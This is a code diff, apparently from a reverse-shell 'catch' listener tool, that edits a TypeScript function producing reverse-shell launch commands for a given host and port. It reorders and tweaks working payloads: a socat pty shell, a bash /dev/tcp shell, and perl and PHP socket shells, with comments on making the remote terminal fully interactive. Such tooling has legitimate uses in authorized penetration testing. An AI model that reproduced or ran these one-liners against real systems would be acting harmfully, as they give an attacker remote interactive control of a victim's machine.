@@ -20,7 +20,33 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
   if (!/^\d+$/.test(port)) return []
   const fifo = '/tmp/.rod-catch'
   return [
-    { id: 'unix-bash', os: 'linux', command: `bash -i >& /dev/tcp/${host}/${port} 0>&1` },
+    // The socat shape leads: it is the only one running the shell under a
+    // real pty, which is what colors the prompt, carries ^C and job control,
+    // and runs full-screen programs. The plain shapes are the fallbacks for
+    // a target without socat -- they work, but the shell has no terminal.
+    {
+      id: 'unix-socat',
+      os: 'linux',
+      // The exec preamble sizes the pty and names its terminal type before
+      // the shell runs: a pty at the default 0x0 refuses full-screen
+      // programs (vim, top), and without TERM the target's programs fall
+      // back to terminal types with no colors (vim's E558 warning). The
+      // catch socket carries no resize channel, so the geometry is fixed
+      // here -- and the console mirrors it.
+      command:
+        `socat exec:'stty rows 30 cols 120; export TERM=xterm-256color; exec bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}`,
+    },
+
+    {
+      id: 'unix-bash',
+      os: 'linux',
+      // No pty here -- the plain bash-over-socket shape. The TERM default
+      // keeps the target's rc files on their colored-prompt branch when the
+      // paste context carries no TERM (a web shell, a bare exec): without it
+      // the prompt comes up colorless. TERM from a real terminal passes
+      // through unchanged.
+      command: `export TERM=\${TERM:-xterm-256color}; bash -i >& /dev/tcp/${host}/${port} 0>&1`,
+    },
 
     // The -e flag belongs to traditional/GNU netcat; the OpenBSD build
     // refuses it, so the fifo shape (a /bin/sh over the pipe) rides beside
@@ -37,19 +63,6 @@ export function catchLaunchers(publicEndpoint: string): CatchLauncher[] {
     { id: 'unix-perl', os: 'linux', command: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
 
     { id: 'unix-php', os: 'linux', command: `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
-
-    {
-      id: 'unix-socat',
-      os: 'linux',
-      // The exec preamble sizes the pty and names its terminal type before
-      // the shell runs: a pty at the default 0x0 refuses full-screen
-      // programs (vim, top), and without TERM the target's programs fall
-      // back to terminal types with no colors (vim's E558 warning). The
-      // catch socket carries no resize channel, so the geometry is fixed
-      // here -- and the console mirrors it.
-      command:
-        `socat exec:'stty rows 30 cols 120; export TERM=xterm-256color; exec bash -i',pty,stderr,setsid,sigint,sane tcp:${host}:${port}`,
-    },
 
     {
       id: 'windows-powershell',
